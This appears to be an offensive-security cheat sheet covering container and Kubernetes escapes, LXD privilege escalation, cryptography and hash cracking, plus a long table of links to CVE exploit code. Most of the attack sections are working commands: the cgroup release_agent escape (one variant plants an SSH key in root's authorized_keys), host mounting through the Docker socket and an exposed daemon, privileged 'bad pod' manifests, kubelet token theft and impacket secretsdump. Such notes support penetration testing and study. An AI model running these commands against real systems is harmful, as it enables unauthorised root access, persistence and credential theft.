> https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so.

#### Requirements

* Already root inside a container
* The container must be run with the SYS_ADMIN Linux capability
* The container must lack an AppArmor profile, or otherwise allow the mount syscall
* The cgroup v1 virtual filesystem must be mounted read-write inside the container

#### Checking Capabilities

```c
$ capsh --print
```

#### Vulnerability Indicator Flag

```c
--security-opt apparmor=unconfined --cap-add=SYS_ADMIN
```

#### Modified PoC by TryHackMe

```c
$ mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
$ echo 1 > /tmp/cgrp/x/notify_on_release
$ host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
$ echo "$host_path/exploit" > /tmp/cgrp/release_agent
$ echo '#!/bin/sh' > /exploit
$ echo "cat /home/cmnatic/<FILE> > $host_path/<FILE>" >> /exploit
$ chmod a+x /exploit
$ sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

#### PoC for SSH Key Deployment

```c
mkdir /tmp/exploit && mount -t cgroup -o rdma cgroup /tmp/exploit && mkdir /tmp/exploit/x
echo 1 > /tmp/exploit/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/exploit/release_agent

echo '#!/bin/sh' > /cmd
echo "echo '<SSH_KEY>' > /root/.ssh/authorized_keys" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/exploit/x/cgroup.procs"
```

### Docker Socket Privilege Escalation

#### Checking for Docker Socket

```c
$ ls -la /var/run | grep sock
```

#### Create a privileged Docker Container and mount the Host Filesystem

```c
$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### Exposed Docker Daemon

#### Checking for Misconfiguration

```c
$ curl http://<RHOST>:2375/version
```

#### Command Execution

```c
$ docker -H tcp://<RHOST>:2375 ps
```

```c
$ docker -H <RHOST>:2375 commit 01ca084c69b7
sha256:aa02ba520ac94c2ca87366344c6c6f49d351a4ef05ba65341109cdccf14619ac

Initial CONTAINER ID: 01ca084c69b7
New COMMIT:           aa02ba520ac94c2ca87366344c6c6f49d351a4ef05ba65341109cdccf14619ac
New CONTAINER ID:     aa02ba520ac9
```

```c
$ docker -H <RHOST>:2375 run -it aa02ba520ac9 /bin/sh
/ # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

### Abusing Namespaces

#### Verify Environment

```c
$ ps aux
```

#### Exploitation via Namespace Enter (nsenter)

```c
$ nsenter --target 1 --mount --uts --ipc --net /bin/bash
```
  
## Docker-Compose

### Common Commands

```c
$ docker-compose up       // (re)create/build and start containers specified in the compose file
$ docker-compose start    // start specific containers from compose file
$ docker-compose down     // stop and delete containers from the compose file
$ docker-compose stop     // stop (not delete) containers from the compose file
$ docker-compose build    // build (not start) containers from the compose file
```

### Create Networks and run Containers

```c
$ docker network create <NETWORK>
$ docker run -p 80:80 --name <NAME> --net <NETWORK> <NAME>
$ docker run --name <NAME> --net <NETWORK> <NAME>
$ docker-compose up
```

### docker-compose.yml Files

| Instruction | Explanation | Example |
| --- | --- | --- |
| version | Placed on top of the file to identify the version of docker-compose the file is written for. | 3.3 |
| services | Marks the beginning of the containers to be managed. | services: |
| name | Define the container and its configuration. | webserver |
| build | Defines the directory containing the Dockerfile for this container/service. | ./<NAME> |
| ports | Publishes ports to the exposed ports (this depends on the image/Dockerfile). | '80:80' |
| volumes | Lists the directories that should be mounted into the container from the host operating system. | './home/<USERNAME>/webserver/:/var/www/html' |
| environment | Pass environment variables (not secure), i.e. passwords, usernames, timezone configurations, etc. | MYSQL_ROOT_PASSWORD=<PASSWORD> |
| image | Defines what image the container should be built with. | mysql:latest |
| networks | Defines what networks the containers will be a part of. Containers can be part of multiple networks. | <NETWORK> |

#### Example docker-compose.yml

```c
version: '3.3'
services:
  web:
    build: ./web
    networks:
      - <NETWORK>
    ports:
      - '80:80'


  database:
    image: mysql:latest
    networks:
      - <NETWORK>
    environment:
      - MYSQL_DATABASE=<DATABASE>
      - MYSQL_USERNAME=root
      - MYSQL_ROOT_PASSWORD=<PASSWORD>
    
networks:
  <NETWORK>:
```

## kubectl

### Installation

> https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/

> https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux

```c
$ sudo apt-get update && sudo apt-get install -y apt-transport-https
$ curl -s https://packages.cloud.google.com/apt/doc/apt-key.gpg | sudo gpg --dearmour -o /usr/share/keyrings/kubernetes.gpg
$ echo "deb [arch=amd64 signed-by=/usr/share/keyrings/kubernetes.gpg] https://apt.kubernetes.io/ kubernetes-xenial main" | sudo tee -a /etc/apt/sources.list.d/kubernetes.list
$ sudo apt-get update
$ sudo apt-get install -y kubectl
```
### Common Commands

```c
$ kubectl get pods                                // list all available pods
$ kubectl get services                            // list all services
$ kubectl get serviceaccount                      // list all serviceaccounts
$ kubectl auth can-i --list                       // check permissions
$ kubectl get secrets                             // list secrets
$ kubectl describe secret <SECRET>                // display secret
$ kubectl get secret <SECRET> -o 'json'           // show in detail
$ kubectl describe pod <CONTAINER>                // get container information
$ kubectl delete pod <CONTAINER>                  // delete a specific container
$ kubectl auth can-i --list --token=<TOKEN>       // check permissions with authentication
$ kubectl apply -f privesc.yml --token=<TOKEN>    // apply pod configuration file
$ kubectl exec -it <CONTAINER> --token=<TOKEN> -- /bin/bash                    // gain access to a container
$ kubectl exec -it everything-allowed-exec-pod --token=<TOKEN> -- /bin/bash    // execute privileged container
```

### Secret Location

```c
/var/run/secrets/kubernetes.io/serviceaccount/token
```

### Bad Pod Container Escape

> https://github.com/BishopFox/badPods/blob/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml

> https://jsonformatter.org/yaml-formatter

```c
$ export token="<TOKEN>"
```

```c
cat << 'EOF' |
apiVersion: v1
kind: Pod
metadata:
  name: everything-allowed-exec-pod
  labels:
    app: pentest
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: everything-allowed-pod
    image: ubuntu
    imagePullPolicy: IfNotPresent
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
  volumes:
  - name: noderoot
    hostPath:
      path: /
EOF
(export NAMESPACE=default && ./kubectl apply -n $NAMESPACE -f - --token=$TOKEN)
```

## kubeletctl

> https://github.com/cyberark/kubeletctl

```c
$ kubeletctl pods -s <RHOST>
$ kubeletctl runningpods -s <RHOST>
$ kubeletctl runningpods -s <RHOST> | jq -c '.items[].metadata | [.name, .namespace]'
$ kubeletctl -s <RHOST> scan rce
$ kubeletctl -s <RHOST> exec "id" -p <POD> -c <CONTAINER>
$ kubeletctl -s <RHOST> exec "/bin/bash" -p <POD> -c <CONTAINER>
$ kubeletctl -s <RHOST> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p <POD> -c <CONTAINER>
```

## Kubernetes

### API RBAC Attack

```c
$ kubectl get namespaces
$ kubectl get pods --all-namespaces -o wide
$ kubectl get pods -n <NAMESPACE>
$ kubectl describe pod <POD> -n <NAMESPACE>
$ kubectl -n <NAMESPACE> --token=<TOKEN> auth can-i --list
$ kubectl get secrets -n <NAMESPACE>
$ kubectl describe secrets/<SECRET> -n <NAMESPACE>
$ kubectl --token=<TOKEN> cluster-info
$ kubectl --token=<TOKEN> auth can-i create pod
$ kubectl create -f <BADPOD>.yaml --token=<TOKEN>
```

## LXD

> https://github.com/saghul/lxd-alpine-builder

### Privilege Escalation

```c
$ sudo ./build-alpine
```

or

```c
$ sudo ./build-alpine -a i686
```

### Configuration

```c
$ lxd init
```

### Settings

```c
Would you like to use LXD clustering? (yes/no) [default=no]:
Do you want to configure a new storage pool? (yes/no) [default=yes]:
Name of the new storage pool [default=default]:
Name of the storage backend to use (dir, lvm, ceph, btrfs) [default=btrfs]: dir
Would you like to connect to a MAAS server? (yes/no) [default=no]:
Would you like to create a new local network bridge? (yes/no) [default=yes]:
What should the new bridge be called? [default=lxdbr0]:
What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]:
What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]:
Would you like LXD to be available over the network? (yes/no) [default=no]:
Would you like stale cached images to be updated automatically? (yes/no) [default=yes]
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]:
```

### Starting

```c
$ lxc launch ubuntu:18.04
```

### Import

```c
$ lxc image import ./alpine-v3.12-x86_64-20200622_0953.tar.gz --alias foobar
```

### Status

```c
$ lxc image list
```

### Security Parameters

```c
$ lxc init foobar ignite -c security.privileged=true
```

### Set mount Options

```c
$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
```

### Starting Image

```c
$ lxc start ignite
```

### Enter Image

```c
$ lxc exec ignite /bin/sh
```







# Cryptography

- [Resources](#resources)

## Table of Contents

- [Base64](#base64)
- [bcrypt](#bcrypt)
- [Creating Password Hashes](#creating-password-hashes)
- [EncFS/6](#encfs6)
- [Featherduster](#featherduster)
- [hash-identifier](#hash-identifier)
- [hashID](#hashid)
- [Magic Function](#magic-function)
- [MD5](#md5)
- [OpenSSL](#openssl)
- [PuTTY Tools](#putty-tools)
- [Python Pickle](#python-pickle)
- [ROT13](#rot13)
- [RSA](#rsa)
- [SHA256](#sha256)
- [XOR](#xor)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| Ciphey | Automatically decrypt encryptions without knowing the key or cipher, decode encodings, and crack hashes | https://github.com/Ciphey/Ciphey |
| FeatherDuster | An automated, modular cryptanalysis tool; i.e., a Weapon of Math Destruction. | https://github.com/nccgroup/featherduster |
| RsaCtfTool | RSA attack tool (mainly for ctf) - retreive private key from weak public key and/or uncipher data. | https://github.com/Ganapati/RsaCtfTool |

## Base64

```c
$ echo aGVsbG8gd29ybGQh | base64 -d
$ base64 -d lasjkdfhalsfsaiusfs | base64 -d -    // double decryption
```

## bcrypt

```c
$ python -c 'import bcrypt; print(bcrypt.hashpw(b"<PASSWORD>", bcrypt.gensalt(rounds=10)).decode("ascii"))'
$ python -c "import bcrypt; print(bcrypt.hashpw('<PASSWORD>'.encode(), bcrypt.gensalt(rounds=10)))"
```

### bcrypt-cli

```c
$ npm install -g @carsondarling/bcrypt-cli
$ bcrypt $(echo -n "<PASSWORD>" | sha256sum | cut -d " " -f 1) && echo
```

## Creating Password Hashes

### Linux

```c
$ cat /etc/shadow
root:$6$YIFGN9pFPOS3EmwO$qwICXAw4bqSjjjFaCT1qYscCV72BjFtx/tehbc7sQTJp09UJj9u83eBio1cLcaxyGkx2oDhJsXT6LL0FABlc5.:18277:0:99999:7:::
```

### Windows

### hashdump.exe

> https://0xprashant.github.io/pages/decryption-instruction/

```c
$ .\hashdump.exe /samdump
```

### secretsdump.py (Impacket)

```c
$ impacket-secretsdump -just-dc-ntlm <DOMAIN>.local/Administrator:"<PASSWORD>"@<RHOST>
```

### Generating Hash

```c
$ echo Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e06543aa40cbb4ab9dff::: | md5sum
9ec906faff027b1337f9df4955f917b9
```

## EncFS/6

```c
$ sudo apt-get install encfs
```

### Decryption

```c
$ encfsctl export <SOURCE_FOLDER> <DESTINATION_FOLDER>
```

## Featherduster

> https://github.com/nccgroup/featherduster

```c
$ git clone https://github.com/nccgroup/featherduster.git
$ cd featherduster
$ python setup.py install
```

## hash-identifier

```c
$ hash-identifier
```

## hashID

```c
$ hashid -m -j '48bb6e862e54f2a795ffc4e541caed4d'
```

## Magic Function

### It tries to detect various Options of Input

> https://gchq.github.io/CyberChef/#recipe=Magic(3,false,false,'')&input=TlZDaWpGN242cGVNN2E3eUxZUFpyUGdIbVdVSGk5N0xDQXpYeFNFVXJhS21l

## MD5

```c
$ echo 85f3980654g59sif | md5sum
```

## OpenSSL

### Create password for /etc/passwd

```c
$ openssl passwd '<PASSWORD>'
```

### Create Password for /etc/shadow

```c
$ openssl passwd -6 -salt xyz  <PASSWORD>
```

### Read a Certificate

```c
$ openssl req -in <FILE>.txt -noout -text
$ openssl req -text -noout -verify -in <FILE>.req
```

### Extracting Certificate

```c
$ openssl pkcs12 -in <PFX>.pfx -clcerts -nokeys -out <CERTIFICATE>.crt
```

### Extracting Private Key

```c
$ openssl pkcs12 -in <PFX>.pfx -nocerts -out <KEY>.key
```

## PuTTY Tools

```c
$ sudo apt-get install putty-tools
```

```c
$ puttygen my_private_key.ppk -O private-openssh -o id_rsa
```

## Python Pickle

```python
import cPickle

f = open('<FILE>', 'r')
mydict = cPickle.load(f)
f.close

for i in mydict:
    b=[]
    for x in i:
        b.append(x[0] * x[1])
    print ''.join(b)
```

## ROT13

> https://tech.pookey.co.uk/non-wp/rot-decoder.php


## RSA

> https://github.com/Ganapati/RsaCtfTool

### Manually breaking RSA

```c
$ python
Python 2.7.18 (default, Apr 20 2020, 20:30:41)
[GCC 9.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from Crypto.PublicKey import RSA
>>> f = open("decoder.pub","r")
>>> key = RSA.importKey(f.read())
>>> print key.n
85161183100445121230463008656121855194098040675901982832345153586114585729131
>>> print key.e
65537
```

### Notes

```c
e = 85161183100445121230463008656121855194098040675901982832345153586114585729131
n = 65537
```

Use `msieve` to get the prime factors which are `e` if multiplied.

```c
$ ./msieve n = 85161183100445121230463008656121855194098040675901982832345153586114585729131
```

### Prime factors

```c
p = 280651103481631199181053614640888768819
q = 303441468941236417171803802700358403049
```

That means: n = pq

```c
280651103481631199181053614640888768819 * 303441468941236417171803802700358403049
```

### modinv function

> https://stackoverflow.com/questions/4798654/modular-multiplicative-inverse-function-in-python

### crypto.py

```c
from Crypto.PublicKey import RSA

n = 85161183100445121230463008656121855194098040675901982832345153586114585729131
e = 65537
p = 280651103481631199181053614640888768819
q = 303441468941236417171803802700358403049
m = n-(p+q-1)

def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = egcd(b % a, a)
        return (g, x - (b // a) * y, y)

def modinv(a, m):
    g, x, y = egcd(a, m)
    if g != 1:
        raise Exception('modular inverse does not exist')
    else:
        return x % m

d = modinv(e, m)
key = RSA.construct((n, long(e), d, p, q))
print key.exportKey()
```

```c
$ python crypto.py
-----BEGIN RSA PRIVATE KEY-----
MIGsAgEAAiEAvEeFgY9UxibHe/Mls88ARrXQ0RNetXeYj3AmLOYUmGsCAwEAAQIg
LvuiAxyjSPcwXGvmgqIrLQxWT1SAKVZwewy/gpO2bKECEQDTI2+4s2LacjlWAWZA
A2kzAhEA5Eizfe3idizLLBr0vsjD6QIRALlM92clYJOQ/csCjWeO1ssCEQDHxRNG
BVGjRsm5XBGHj1tZAhEAkJAmnUZ7ivTvKY17SIkqPQ==
-----END RSA PRIVATE KEY-----
```

Write it into a file named `decoder.priv`

### Decrypt the File

```c
$ openssl rsautl -decrypt -inkey decoder.priv < pass.crypt
```

## SHA256

### Proof of Concept

```c
$ echo -n fff34363f4d15e958f0fb9a7c2e7cc550a5672321d54b5712cd6e4fa17cd2ac8 | wc -c
64
```

```c
$ echo foobar | sha256sum
aec070645fe53ee3b3763059376134f058cc337247c978add178b6ccdfb0019f  -
```

```c
$ echo -n aec070645fe53ee3b3763059376134f058cc337247c978add178b6ccdfb0019f | wc -c
64
```

### Creating SHA256 hashed Password with Python

```c
$ python3          
Python 3.10.6 (main, Aug 10 2022, 11:19:32) [GCC 12.1.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import hashlib
>>> password = "password123"
>>> encoded = password.encode()
>>> result = hashlib.sha256(encoded)
>>> print(result)
<sha256 _hashlib.HASH object @ 0x7f315f0a96f0>
>>> print(result.hexdigest())
ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f
```

## XOR

### XOR Table

```c
^ = XOE

1 ^ 1 = 0
1 ^ 0 = 1
0 ^ 1 = 1
0 ^ 0 = 0
```

### Byte Flip Attack

```c
110011 flipped with 111111 = 001100
```







# CVE

- [Exploit Databases](#exploit-databases)
- [Resources](#resources)

## Table of Contents

- [CVE-2005-4890: TTY Hijacking / TTY Input Pushback via TIOCSTI](#cve-2005-4890-tty-hijacking--tty-input-pushback-via-tiocsti)
- [CVE-2014-6271: Shellshock RCE PoC](#cve-2014-6271-shellshock-rce-poc)
- [CVE-2016-1531: exim LPE](#cve-2016-1531-exim-lpe)
- [CVE-2019-14287: Sudo Bypass](#cve-2019-14287-sudo-bypass)
- [CVE-2020-1472: ZeroLogon LPE](#cve-2020-1472-zerologon-lpe)
- [CVE-2021–3156: Sudo / sudoedit LPE](#cve-2021-3156-sudo--sudoedit-lpe)
- [CVE-2021-41773, CVE-2021-42013, CVE-2020-17519: Simples Apache Path Traversal (0-day)](#cve-2021-41773-cve-2021-42013-cve-2020-17519-simples-apache-path-traversal-0-day)
- [CVE-2021-43798: Grafana Directory Traversal and Arbitrary File Read (0-day)](#cve-2021-43798-grafana-directory-traversal-and-arbitrary-file-read-0-day)
- [CVE-2021-44228: Log4Shell RCE (0-day)](#cve-2021-44228-log4shell-rce-0-day)
- [CVE-2022-0847: Dirty Pipe LPE](#cve-2022-0847-dirty-pipe-lpe)
- [CVE-2022-1040: Sophos XG Firewall Authentication Bypass RCE](#cve-2022-1040-sophos-xg-authentication-bypass-rce)
- [CVE-2022-21675: Zip Slip](#cve-2022-21675-zip-slip)
- [CVE-2022-22963: Spring4Shell RCE (0-day)](#cve-2022-22963-spring4shell-rce-0-day)
- [CVE-2022-30190: MS-MSDT Follina RCE](#cve-2022-30190-ms-msdt-follina-rce)
- [CVE-2022-31214: Firejail LPE](#cve-2022-31214-firejail-lpe)
- [CVE-2022-44268: ImageMagick Arbitrary File Read PoC](#cve-2022-44268-imagemagick-arbitrary-file-read-poc)
- [CVE-2023-0126: SonicWall SMA1000 Pre-Authentication Path Traversal Vulnerability](#cve-2023-0126-sonicwall-sma1000-pre-authentication-path-traversal-vulnerability)
- [CVE-2023-21716: Microsoft Word RTF Font Table Heap Corruption RCE PoC (Python Implementation)](#cve-2023-21716-microsoft-word-rtf-font-table-heap-corruption-rce-poc-python-implementation)
- [CVE-2023-21746: Windows NTLM EoP LocalPotato LPE](#cve-2023-21746-windows-ntlm-eop-localpotato-lpe)
- [CVE-2023-22515: Confluence Server and Confluence Data Center Broken Access Control (0-day)](#cve-2023-22515-confluence-server-and-confluence-data-center-broken-access-control-0-day)
- [CVE-2023-22809: Sudo Bypass LPE](#cve-2023-22809-sudo-bypass-lpe)
- [CVE-2023-23397: Microsoft Outlook (Click-to-Run) LPE (0-day) (PowerShell Implementation)](#cve-2023-23397-microsoft-outlook-click-to-run-lpe-0-day-powershell-implementation)
- [CVE-2023-32629, CVE-2023-2640: GameOverlay Ubuntu Kernel Exploit LPE (0-day)](#cve-2023-32629-cve-2023-2640-gameoverlay-ubuntu-kernel-exploit-lpe-0-day)
- [CVE-2023-38146: ThemeBleed RCE](#cve-2023-38146-themebleed-rce)
- [CVE-2023-46604: Apache ActiveMQ OpenWire Transport RCE](#cve-2023-46604-apache-activemq-openwire-transport-rce)
- [CVE-2023-4911: Looney Tunables LPE](#cve-2023-4911-looney-tunables-lpe)
- [CVE-2023-7028: GitLab Account Takeover](#cve-2023-7028-gitlab-account-takeover)
- [CVE-2024-21626: Leaky Vessels Container Escape](#cve-2024-21626-leaky-vessels-container-escape)
- [CVE-2024-23897: Jenkins Arbitrary File Read](#cve-2024-23897-jenkins-arbitrary-file-read)
- [GodPotato LPE](#godpotato-lpe)
- [Juicy Potato LPE](#juicy-potato-lpe)
- [JuicyPotatoNG LPE](#juicypotatong-lpe)
- [MySQL 4.x/5.0 User-Defined Function (UDF) Dynamic Library (2) LPE](#mysql-4x50-user-defined-function-udf-dynamic-library-2-lpe)
- [PrintSpoofer LPE](#printspoofer-lpe)
- [RemotePotato0 LPE](#remotepotato0-lpe)
- [SharpEfsPotato LPE](#sharpefspotato-lpe)
- [Shocker Container Escape](#shocker-container-escape)
- [ThinkPHP < 6.0.14 Remote Code Execution RCE](#thinkphp--6014-remote-code-execution-rce)

## Exploit Databases

| Database | URL |
| --- | --- |
| Exploit Database | https://www.exploit-db.com |
| Sploitus | https://sploitus.com |
| Packet Storm | https://packetstormsecurity.com |
| 0day.today Exploit Database | https://0day.today |

## Resources

| CVE | Descritpion | URL |
| --- | --- | --- |
| CVE-2014-6271 | Shocker RCE | https://github.com/nccgroup/shocker |
| CVE-2014-6271 | Shellshock RCE PoC | https://github.com/zalalov/CVE-2014-6271 |
| CVE-2014-6271 | Shellshocker RCE POCs | https://github.com/mubix/shellshocker-pocs |
| CVE-2016-5195 | Dirty COW LPE | https://github.com/firefart/dirtycow |
| CVE-2016-5195 | Dirty COW '/proc/self/mem' Race Condition (/etc/passwd Method) LPE | https://www.exploit-db.com/exploits/40847 |
| CVE-2016-5195 | Dirty COW 'PTRACE_POKEDATA' Race Condition (/etc/passwd Method) LPE | https://www.exploit-db.com/exploits/40839 |
| CVE-2017-0144 | EternalBlue (MS17-010) RCE | https://github.com/d4t4s3c/Win7Blue |
| CVE-2017-0199 | RTF Dynamite RCE | https://github.com/bhdresh/CVE-2017-0199 |
| CVE-2018-7600 | Drupalgeddon 2 RCE | https://github.com/g0rx/CVE-2018-7600-Drupal-RCE |
| CVE-2018-10933 | libSSH Authentication Bypass | https://github.com/blacknbunny/CVE-2018-10933 |
| CVE-2018-16509 | Ghostscript PIL RCE | https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509 |
| CVE-2019-14287 | Sudo Bypass LPE | https://github.com/n0w4n/CVE-2019-14287 |
| CVE-2019-18634 | Sudo Buffer Overflow LPE | https://github.com/saleemrashid/sudo-cve-2019-18634 |
| CVE-2019-5736 | RunC Container Escape PoC | https://github.com/Frichetten/CVE-2019-5736-PoC |
| CVE-2019-6447 | ES File Explorer Open Port Arbitrary File Read | https://github.com/fs0c131y/ESFileExplorerOpenPortVuln |
| CVE-2019-7304 | dirty_sock LPE | https://github.com/initstring/dirty_sock |
| CVE-2020-0796 | SMBGhost RCE PoC | https://github.com/chompie1337/SMBGhost_RCE_PoC |
| CVE-2020-1472 | ZeroLogon LPE Checker & Exploitation Code | https://github.com/VoidSec/CVE-2020-1472 |
| CVE-2020-1472 | ZeroLogon LPE Exploitation Script | https://github.com/risksense/zerologon |
| CVE-2020-1472 | ZeroLogon LPE PoC | https://github.com/dirkjanm/CVE-2020-1472 |
| CVE-2020-1472 | ZeroLogon LPE Testing Script | https://github.com/SecuraBV/CVE-2020-1472 |
| CVE-2021-1675,CVE-2021-34527 | PrintNightmare LPE RCE | https://github.com/nemo-wq/PrintNightmare-CVE-2021-34527 |
| CVE-2021-1675 | PrintNightmare LPE RCE (PowerShell Implementation) | https://github.com/calebstewart/CVE-2021-1675 |
| CVE-2021-21972 | vCenter RCE | https://github.com/horizon3ai/CVE-2021-21972 |
| CVE-2021-22204 | ExifTool Command Injection RCE | https://github.com/AssassinUKG/CVE-2021-22204 |
| CVE-2021-22204 | GitLab ExifTool RCE | https://github.com/CsEnox/Gitlab-Exiftool-RCE |
| CVE-2021-22204 | GitLab ExifTool RCE (Python Implementation) | https://github.com/convisolabs/CVE-2021-22204-exiftool |
| CVE-2021-26085 | Confluence Server RCE | https://github.com/Phuong39/CVE-2021-26085 |
| CVE-2021-27928 | MariaDB/MySQL wsrep provider RCE | https://github.com/Al1ex/CVE-2021-27928 |
| CVE-2021-3129 | Laravel Framework RCE | https://github.com/nth347/CVE-2021-3129_exploit |
| CVE-2021-3156 | Sudo / sudoedit LPE  | https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit |
| CVE-2021-3156 | Sudo / sudoedit LPE PoC | https://github.com/blasty/CVE-2021-3156 |
| CVE-2021-3493 | OverlayFS Ubuntu Kernel Exploit LPE | https://github.com/briskets/CVE-2021-3493 |
| CVE-2021-3560 | polkit LPE (C Implementation) | https://github.com/hakivvi/CVE-2021-3560 |
| CVE-2021-3560 | polkit LPE | https://github.com/Almorabea/Polkit-exploit |
| CVE-2021-3560 | polkit LPE PoC | https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation |
| CVE-2021-36934 | HiveNightmare LPE | https://github.com/GossiTheDog/HiveNightmare |
| CVE-2021-36942 | PetitPotam | https://github.com/topotam/PetitPotam |
| CVE-2021-36942 | DFSCoerce | https://github.com/Wh04m1001/DFSCoerce |
| CVE-2021-4034 | PwnKit Pkexec Self-contained Exploit LPE | https://github.com/ly4k/PwnKit |
| CVE-2021-4034 | PwnKit Pkexec LPE PoC (1) | https://github.com/dzonerzy/poc-cve-2021-4034 |
| CVE-2021-4034 | PwnKit Pkexec LPE PoC (2) | https://github.com/arthepsy/CVE-2021-4034 |
| CVE-2021-4034 | PwnKit Pkexec LPE PoC (3) | https://github.com/nikaiw/CVE-2021-4034 |
| CVE-2021-40444 | MSHTML builders RCE | https://github.com/aslitsecurity/CVE-2021-40444_builders |
| CVE-2021-40444 | MSHTML Exploit RCE | https://xret2pwn.github.io/CVE-2021-40444-Analysis-and-Exploit/ |
| CVE-2021-40444 | MSHTML RCE PoC | https://github.com/lockedbyte/CVE-2021-40444 |
| CVE-2021-41379 | InstallerFileTakeOver LPE (0-day) (Archive) | https://github.com/klinix5/InstallerFileTakeOver |
| CVE-2021-41379 | InstallerFileTakeOver LPE (0-day) (Fork) | https://github.com/waltlin/CVE-2021-41379-With-Public-Exploit-Lets-You-Become-An-Admin-InstallerFileTakeOver |
| CVE-2021-41773,CVE-2021-42013, CVE-2020-17519 | Simples Apache Path Traversal (0-day) | https://github.com/MrCl0wnLab/SimplesApachePathTraversal |
| CVE-2021-42278,CVE-2021-42287 | sam-the-admin, sAMAccountName Spoofing / Domain Admin Impersonation LPE | https://github.com/WazeHell/sam-the-admin |
| CVE-2021-42278 | sam-the-admin, sAMAccountName Spoofing / Domain Admin Impersonation LPE (Python Implementation) | https://github.com/ly4k/Pachine |
| CVE-2021-42287,CVE-2021-42278 | noPac LPE (1) | https://github.com/cube0x0/noPac |
| CVE-2021-42287,CVE-2021-42278 | noPac LPE (2) | https://github.com/Ridter/noPac |
| CVE-2021-42321 | Microsoft Exchange Server RCE | https://gist.github.com/testanull/0188c1ae847f37a70fe536123d14f398 |
| CVE-2021-44228 | Log4Shell RCE (0-day) | https://github.com/kozmer/log4j-shell-poc |
| CVE-2021-44228 | Log4Shell RCE (0-day) | https://github.com/welk1n/JNDI-Injection-Exploit |
| CVE-2022-0847 | DirtyPipe-Exploits LPE | https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits |
| CVE-2022-21999 | SpoolFool, Windows Print Spooler LPE | https://github.com/ly4k/SpoolFool |
| CVE-2022-22963 | Spring4Shell RCE (0-day) | https://github.com/tweedge/springcore-0day-en |
| CVE-2022-23119,CVE-2022-23120 | Trend Micro Deep Security Agent for Linux Arbitrary File Read | https://github.com/modzero/MZ-21-02-Trendmicro |
| CVE-2022-24715 | Icinga Web 2 Authenticated Remote Code Execution RCE | https://github.com/JacobEbben/CVE-2022-24715 |
| CVE-2022-26134 | ConfluentPwn RCE (0-day) | https://github.com/redhuntlabs/ConfluentPwn |
| CVE-2022-30190 | MS-MSDT Follina Attack Vector RCE | https://github.com/JohnHammond/msdt-follina |
| CVE-2022-30190 | MS-MSDT Follina RCE PoC | https://github.com/onecloudemoji/CVE-2022-30190 |
| CVE-2022-30190 | MS-MSDT Follina RCE (Python Implementation) | https://github.com/chvancooten/follina.py |
| CVE-2022-31214 | Firejail / Firejoin LPE | https://seclists.org/oss-sec/2022/q2/188 |
| CVE-2022-31214 | Firejail / Firejoin LPE | https://www.openwall.com/lists/oss-security/2022/06/08/10 |
| CVE-2022-34918 | Netfilter Kernel Exploit LPE | https://github.com/randorisec/CVE-2022-34918-LPE-PoC |
| CVE-2022-46169 | Cacti Authentication Bypass RCE | https://github.com/ariyaadinatha/cacti-cve-2022-46169-exploit |
| CVE-2023-21716 | CVE-2023-21716: Microsoft Word RTF Font Table Heap Corruption RCE PoC (Python Implementation) | https://github.com/Xnuvers007/CVE-2023-21716 |
| CVE-2023-21746 | Windows NTLM EoP LocalPotato LPE | https://github.com/decoder-it/LocalPotato |
| CVE-2023-21768 | Windows Ancillary Function Driver for WinSock LPE POC | https://github.com/chompie1337/Windows_LPE_AFD_CVE-2023-21768 |
| CVE-2023-21817 | Kerberos Unlock LPE PoC | https://gist.github.com/monoxgas/f615514fb51ebb55a7229f3cf79cf95b |
| CVE-2023-22518 | Atlassian Confluence Server Improper Authorization RCE | https://github.com/sanjai-AK47/CVE-2023-22518 |
| CVE-2023-22809 | sudoedit LPE | https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc |
| CVE-2023-23397 | Microsoft Outlook (Click-to-Run) LPE (0-day) | https://github.com/sqrtZeroKnowledge/CVE-2023-23397_EXPLOIT_0DAY |
| CVE-2023-23397 | Microsoft Outlook (Click-to-Run) LPE (0-day) (PowerShell Implementation) | https://github.com/api0cradle/CVE-2023-23397-POC-Powershell |
| CVE-2023-23397 | Microsoft Outlook (Click-to-Run) LPE (0-day) (Python Implementation) | https://github.com/Trackflaw/CVE-2023-23397 |
| CVE-2023-23752 | Joomla Unauthenticated Information Disclosure | https://github.com/Acceis/exploit-CVE-2023-23752 |
